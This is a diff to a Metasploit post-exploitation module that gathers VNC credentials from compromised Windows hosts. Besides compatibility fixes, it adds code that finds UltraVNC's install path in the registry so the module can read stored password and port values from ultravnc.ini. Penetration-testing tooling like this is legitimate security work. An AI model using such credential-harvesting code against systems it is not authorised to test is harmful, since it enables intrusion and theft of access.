@@ -10,7 +10,7 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 require 'rex/proto/rfb'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Post
       open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
 
       data = open_key.query_value(variable).data
-      if data.class == Fixnum
+      if data.kind_of? Integer
         return data
       else
         value = data.unpack('H*')[0].to_s
@@ -106,6 +106,20 @@ class Metasploit3 < Msf::Post
         :pass_variable => 'passwd=',
         :viewonly_variable => 'passwd2=',
         :port_variable => 'PortNumber='}
+    end
+
+    #check uninstall key
+    begin
+      root_key, base_key = session.sys.registry.splitkey("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Ultravnc2_is1")
+      open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
+      vnclocation = open_key.query_value("InstallLocation").data
+      locations << {:name => 'UltraVNC',
+        :check_file => vnclocation + "\\ultravnc.ini",
+        :pass_variable => 'passwd=',
+        :viewonly_variable => 'passwd2=',
+        :port_variable => 'PortNumber='}
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
 
     locations << {:name => 'WinVNC3_HKLM',
